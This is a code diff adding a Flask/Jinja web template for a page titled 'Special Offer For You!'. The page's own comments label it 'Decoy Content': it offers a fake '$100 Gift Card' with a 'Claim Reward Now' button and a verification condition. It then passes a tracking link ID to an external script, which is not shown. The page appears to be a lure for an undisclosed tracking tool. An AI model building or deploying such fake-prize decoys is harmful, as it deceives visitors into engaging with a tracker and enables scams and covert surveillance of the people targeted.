@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Special Offer For You!</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/track.css') }}">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Decoy Content -->
+    <div class="decoy-container" id="decoy-container">
+        <div class="decoy-card">
+            <div class="decoy-badge">EXCLUSIVE BONUS</div>
+            <h1>Congratulations!</h1>
+            <p class="decoy-text">You have been selected for a special limited-time promo offer. Claim your free reward below!</p>
+            <div class="reward-box">
+                <span class="reward-value">$100 Gift Card</span>
+            </div>
+            <button class="btn btn-primary" id="claim-btn">Claim Reward Now</button>
+            <p class="terms">Terms & conditions apply. Must be verified to unlock reward.</p>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay hidden" id="loading-overlay">
+        <div class="spinner"></div>
+        <p class="loading-text">Loading...</p>
+    </div>
+
+    <!-- Pass link ID to JS -->
+    <script>
+        window.TRACKING_LINK_ID = "{{ link_id }}";
+    </script>
+    <script src="{{ url_for('static', filename='js/track.js') }}"></script>
+</body>
+</html>
